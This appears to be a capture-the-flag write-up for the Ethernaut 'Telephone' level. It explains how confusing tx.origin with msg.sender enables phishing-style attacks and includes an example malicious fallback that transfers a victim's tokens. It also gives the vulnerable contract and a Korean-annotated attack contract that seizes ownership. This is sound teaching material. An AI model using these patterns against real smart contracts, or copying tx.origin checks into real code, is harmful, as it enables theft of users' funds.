We're hiring!
logo
This level is not translated or translation is incomplete.Click here to improve the translation

●○○○○

Telephone


Telephone level
While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.

An example of a possible attack is outlined below.

Use tx.origin to determine whose tokens to transfer, e.g.
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
function () payable {
  token.transfer(attackerAddress, 10000);
}
In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

// 해킹 컨트랙트

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
    function owner() external view returns (address);
}

contract TelephoneAttack{
    ITelephone target;
    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address _owner) external {
        target.changeOwner(_owner);
    }

    function owner() external view returns (address) {
        return target.owner();
    }
}

/*
취약점
tx.origin과 msg.sender가 다르면 소유권이 변경 가능하다

풀이
1. TelephoneAttack 컨트랙트를 배포한다.
2. attack() 함수에 player주소를 넣어 호출한다.
3. Telephone 컨트랙트의 owner가 player로 변경된다.
끝
*/